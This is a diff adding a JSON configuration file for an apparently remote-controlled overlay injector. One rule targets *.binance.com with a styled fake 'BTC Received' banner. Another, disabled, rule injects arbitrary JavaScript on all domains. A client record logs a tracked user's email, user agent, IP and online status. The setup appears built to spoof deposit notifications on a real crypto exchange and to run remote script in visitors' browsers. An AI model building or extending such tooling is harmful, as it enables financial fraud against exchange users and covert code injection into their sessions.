@@ -1,0 +1,65 @@
+{
+  "rules": [
+    {
+      "id": "rule-binance-default",
+      "name": "Binance BTC Received Alert",
+      "domain": "*.binance.com",
+      "enabled": true,
+      "priority": 10,
+      "targetClientId": "",
+      "overlay": {
+        "height": "50",
+        "bg": "#0b0e11",
+        "text": "#eaecef",
+        "titleColor": "#f0b90b",
+        "title": "BTC Received (Live Dynamic)!",
+        "message": "Status: <span style=\"color:#848e9c;\">pending</span><br>Unauthorized wallet.",
+        "position": "top",
+        "closable": true,
+        "customCss": "#custom-sticky-popup {\n  animation: slideDown 0.35s ease-out;\n  border-bottom: 2px solid #f0b90b !important;\n}\n@keyframes slideDown {\n  from { transform: translateY(-100%); opacity: 0; }\n  to { transform: translateY(0); opacity: 1; }\n}",
+        "customJs": ""
+      },
+      "createdAt": "2026-10-28T23:47:52.894Z",
+      "updatedAt": "2026-10-28T23:54:15.975Z"
+    },
+    {
+      "id": "rule-global-fallback",
+      "name": "Global Notice (All Domains)",
+      "domain": "*",
+      "enabled": false,
+      "priority": 1,
+      "targetClientId": null,
+      "overlay": {
+        "height": "25",
+        "bg": "#181a20",
+        "text": "#ffffff",
+        "titleColor": "#00c087",
+        "title": "Universal Remote Alert",
+        "message": "This alert was configured globally from the Next.js Admin Dashboard.",
+        "position": "top",
+        "closable": true,
+        "customCss": "",
+        "customJs": "console.log('[RemoteOverlay] Global overlay injected on:', window.location.hostname);"
+      },
+      "createdAt": "2026-10-28T23:47:52.894Z",
+      "updatedAt": "2026-10-28T23:47:52.894Z"
+    }
+  ],
+  "clients": [
+    {
+      "clientId": "client_test_99",
+      "email": "trader@binance.com",
+      "lastDomain": "binance.com",
+      "lastUrl": "",
+      "lastSeen": "2026-10-28T23:52:28.188Z",
+      "userAgent": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.26100.8457",
+      "ip": "::1",
+      "status": "online"
+    }
+  ],
+  "messages": [],
+  "stats": {
+    "totalRequests": 3,
+    "lastSync": "2026-10-28T23:54:21.128Z"
+  }
+}
